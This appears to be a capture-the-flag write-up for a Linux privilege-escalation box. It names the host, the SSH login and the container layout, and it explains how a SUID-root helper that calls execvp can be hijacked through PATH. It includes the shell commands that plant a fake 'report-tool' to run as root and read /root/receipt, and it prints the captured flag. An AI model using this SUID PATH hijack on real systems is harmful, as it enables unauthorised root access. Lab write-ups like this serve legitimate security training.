# Pitlane Desk (misc / linux-path)

- Desk app: http://54.72.82.22:8540/ (theme RACING)
- SSH: player@54.72.82.22:8700  pw `matinee-visitor` (paramiko)
- Container `d44a86ce1002`, Ubuntu 22.04. Root runs `python /app/service.py` (Flask).
- `/app/settings.json` kind = `linux-path`; the flag is NOT in the web app — it is
  written by `/app/linux/start.sh` to `/root/receipt` (0400 root) from `$FLAG`.

## The intended path (not the Workshop Nocturne tar/HMAC worker — this box is different)
`/app/linux/install.sh` installs a SUID-root helper:
- `/usr/local/bin/stage-report` — built from `report.c`, `chmod 4755`.
- `report.c`: `setgid(0); setuid(0); execvp("report-tool", ...)`.
`execvp` searches the caller's `PATH`, so a fake `report-tool` placed earlier in
PATH is executed **as root** (classic SUID PATH hijack).

## Winning steps
```
mkdir -p ~/bin
printf '#!/bin/sh\nid\ncat /root/receipt\n' > ~/bin/report-tool && chmod +x ~/bin/report-tool
PATH=~/bin:$PATH /usr/local/bin/stage-report
```
Output: `uid=0(root) ...` then `cat /root/receipt`.

## Flag
`safctf{9cca688790c893101757448298adfb67}`

## Artifacts (kept out of git; no binary downloads needed)
- All source read over SSH from the container: /app/service.py, /app/linux/{install.sh,report.c,start.sh}.
- sha256(install.sh)=recorded below? not needed — sources live in-container, nothing downloaded.
